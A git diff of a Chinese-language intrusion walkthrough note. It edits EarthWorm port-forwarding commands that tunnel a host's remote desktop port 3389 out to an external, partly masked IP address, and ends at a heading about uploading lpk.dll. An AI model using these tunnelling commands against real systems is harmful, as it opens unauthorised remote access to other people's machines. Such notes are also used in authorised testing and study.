@@ -23,7 +23,8 @@ Proxifie直接配置全局代理
 有点不稳 还是来一把端口转发吧
 ```
 ew_for_Linux32.exe -s lcx_slave -d 45.*.*.190 -e 2222 -f 127.0.0.1 -g 3389
-ew_for_Linux32 -s lcx_listen -l 443 -e 2222
+#发现一个
+ew_for_Linux32 -s lcx_listen -l 3389 -e 2222
 ```
 
 # 上传lpk.dll
